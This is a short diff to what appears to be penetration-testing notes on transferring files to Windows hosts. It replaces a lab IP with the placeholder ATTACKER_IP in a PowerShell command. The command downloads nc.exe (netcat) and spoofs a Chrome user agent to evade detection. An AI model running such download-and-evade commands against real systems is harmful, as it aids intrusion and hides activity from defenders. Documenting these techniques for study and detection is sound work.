@@ -41,7 +41,7 @@ Each download tool has a tell-tale user agent (`Microsoft BITS/7.8`, `Microsoft-
 ```powershell
 # Use a Chrome user agent for Invoke-WebRequest
 $ua = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
-Invoke-WebRequest http://10.10.14.5/nc.exe -UserAgent $ua -OutFile C:\Temp\nc.exe
+Invoke-WebRequest http://ATTACKER_IP/nc.exe -UserAgent $ua -OutFile C:\Temp\nc.exe
 ```
 
 ## Notes
